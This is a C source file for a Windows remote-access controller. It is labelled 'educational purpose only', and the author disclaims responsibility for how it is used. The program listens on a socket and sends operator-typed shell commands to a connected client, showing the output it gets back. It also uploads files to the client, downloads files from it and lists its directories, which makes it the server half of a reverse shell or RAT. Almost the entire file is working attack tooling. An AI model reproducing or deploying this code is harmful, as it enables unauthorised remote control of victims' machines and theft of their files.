/*
* Created By: EH
* -----------------------
* Educational purpose only             
* I'm not responsible for your actions 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define BUFF_LEN 9000

struct store {
    char buffer[1024];
    char name[1024];
    int size;
    int bytesRecvd;
};

int getSize(char* filename) {
    FILE* fptr;
    int out = 0;
    if ( (fptr = fopen(filename, "rb")) == NULL ) {
        return 1;
    }

    fseek(fptr, 0L, SEEK_END);
    out = ftell(fptr);
    fclose(fptr);    

    return out;
}

int get_char_len( char* in ) {
    int output = 0;
    for ( int i = 0; in[i] != '\0'; i++, output++ );

    return output;
}


int is_file_exist( char* name ) {
    FILE* fptr;

    if ( (fptr = fopen(name, "rb")) == NULL ) {
        return 1;
    }
    fclose(fptr);

    return 0;
}


int download_file( SOCKET sock ) {
    FILE* fptr;
    struct store pt;
    
    pt.bytesRecvd = recv(sock, pt.buffer, sizeof(pt.buffer), 0);
    pt.size = atoi(pt.buffer);
    memset(pt.buffer, 0, sizeof(pt.buffer));
    pt.bytesRecvd = recv(sock, pt.name, sizeof(pt.name), 0);
    fptr = fopen(pt.name, "ab");

    if (fptr == NULL) {
        return 1;
    }
    
    printf("[*]File name: %s\n", pt.name);
    printf("[*]Size: %d\n", pt.size);

    pt.bytesRecvd = 0;
    while (pt.size > 0) {
        pt.bytesRecvd = recv(sock, pt.buffer, sizeof(pt.buffer), 0);
        pt.size -= pt.bytesRecvd;
        fwrite(pt.buffer, pt.bytesRecvd, 1, fptr);
        memset(pt.buffer, 0, sizeof(pt.buffer));
    }

    printf("[*]Finished\n");
    fclose(fptr);
    
    return 0;
}

int upload_file( char* filename, SOCKET sock ) {
    FILE* fptr;
    fptr = fopen(filename, "rb");
    
    if (fptr == NULL) {
        return 1;
    }
    
    int bytesSent = 0;
    char buffer[1024];

    sprintf(buffer, "%d", getSize(filename));
    printf("[*]Size: %s\n", buffer);

    send(sock, buffer, sizeof(buffer), 0);
    recv(sock, buffer, sizeof(buffer), 0);
    
    Sleep(3000);
    
    bytesSent = send(sock, filename, strlen(filename)+1, 0);
    recv(sock, buffer, sizeof(buffer), 0);
    memset(buffer, 0, sizeof(buffer));
    
    Sleep(3000);
    while ( (bytesSent = fread(buffer, 1, sizeof(buffer), fptr) ) > 0) {
        send(sock, buffer, bytesSent, 0);
        memset(buffer, 0, sizeof(buffer));
    }
    
    memset(buffer, 0, sizeof(buffer));
    printf("[*]Waiting for response...\n");

    recv(sock, buffer, sizeof(buffer), 0);    
    printf("[*]Finished\n");

    fclose(fptr);

    return 0;
}


int ls_dir( SOCKET sock ) {
    int bytesRecvd;
    char buffer[1000];
    
    while ( (bytesRecvd = recv(sock, buffer, sizeof(buffer), 0)) > 0 ) {
        if (strcmp(buffer, "\n\n\n") == 0) {
            break;
        }
        printf("%s", buffer);
        send(sock, "done", sizeof("done"), 0);
        memset(buffer, 0, sizeof(buffer));
    }

    return 0;
}


int first_word( char* found, char* command ) {
    int size = get_char_len(found);

    if ( size >= get_char_len(command) ) {
        for ( int i = 0; i < size; i++ ) {
            if (found[i] == ' ' && command[i] == ' ' || found[i] == ' ' && command[i] == '\0'
            || found[i] == '\n' && command[i] == '\0' ) 
            {
                return 0;
            }
            else if ( found[i] != command[i] ) {
                return 1;
            }
        }   
    }
    else {
        return 1;
    }

    return 0;
}



int serversoc( char* ip, int port ) {
    WSADATA wsadata;
    SOCKET server, client;
    SOCKADDR_IN serveraddr, clientaddr;
    int iresult;
    int bytesSent;
    int bytesRecvd;
    int code;
    int i;
    int count;
    char out_msg[BUFF_LEN];

    iresult = WSAStartup(MAKEWORD(2, 0), &wsadata);

    if ( iresult != 0 ) {
        printf("[-]Startup error\n");
        WSACleanup();
        return 1;
    }

    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(port);
    serveraddr.sin_addr.S_un.S_addr = inet_addr(ip);

    server = socket(AF_INET, SOCK_STREAM, 0);
    
    if ( server == INVALID_SOCKET ) {
        printf("[-]INVALID_SOCKET\n");
        closesocket(server);
        WSACleanup();
        return 1;
    }

    bind(server, (SOCKADDR*)&serveraddr, sizeof(serveraddr));
    iresult = listen(server, 0);

    if ( iresult == SOCKET_ERROR ) {
        printf("SOCKET_ERROR\n");
        closesocket(server);
        WSACleanup();
        return 1;
    }
    
    
    char buffer[BUFF_LEN];
    char msg[BUFF_LEN];
    int clientaddrsize = sizeof(clientaddr);

    printf("Listening -> %s %d\n", ip, port);
    client = accept(server, (SOCKADDR*)&clientaddr, &clientaddrsize);
    
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(msg, 0, sizeof(msg));
        memset(out_msg, 0, sizeof(out_msg));
        
        printf("/> ");
        fgets(msg, BUFF_LEN, stdin);

        if ( first_word(msg, "upload_file") == 0 ) {
            count = 0;
            for (i = 12; i < strlen(msg); i++)
            {
                out_msg[count] = msg[i];
                count++;
            }
            out_msg[count-1] = '\0';

            if (is_file_exist(out_msg) != 0)
            {
                printf("[-]File Does not exist\n");
                continue;
            }
            send(client, "upload_file", strlen("upload_file"), 0);
            
            printf("[*]Sending...\n");
            printf("[*]File Name: %s\n", out_msg);
            Sleep(3000);
            code = upload_file(out_msg, client);
            
            printf("\n");
            continue;            
        }
        else if ( first_word(msg, "download_file") == 0 ) {
            bytesSent = send(client, msg, strlen(msg), 0);
            bytesRecvd = recv(client, buffer, BUFF_LEN, 0);

            if (strcmp(buffer, "\n\n\n") == 0) {
                code = download_file(client);
            }
            else
            {
                printf("[-]Error File Not Found");
            }

            printf("\n");

            if (code != 0) {
                printf("error\n");
            }

            continue;
        }
        else if ( strcmp(msg, "upload_file") == 0 ) {
            printf("to upload file: upload_file [filename]\n");
            continue;
        }
        else if ( strcmp(msg,"ls\n") == 0 || strcmp(msg,"dir\n") == 0 ) {
            send(client, msg, strlen(msg), 0);
            ls_dir(client);
            continue;
        }
        else if ( strcmp(msg, "exit_client\n") == 0 ) {
            send(client, msg, strlen(msg), 0);
            break;
        }
        else if ( strcmp(msg, "exit\n") == 0 ) {
            break;
        }

        send(client, msg, strlen(msg), 0);
        Sleep(3000);
        bytesRecvd = recv(client, buffer, sizeof(buffer), 0);
        printf("\n");
        puts(buffer);
    }

    printf("\n[*]Closing Socket\n");
    closesocket(server);
    closesocket(client);
    WSACleanup();
    return 0;
}


int main( int argc, char* argv[] ) {
    
    if ( argc < 3 ) {
        printf("usage: ./server.exe [IP] [PORT]");
        return 1;
    }

    serversoc(argv[1], atoi(argv[2]));
    printf("[*]Disconnected\n");
    return 0;
}
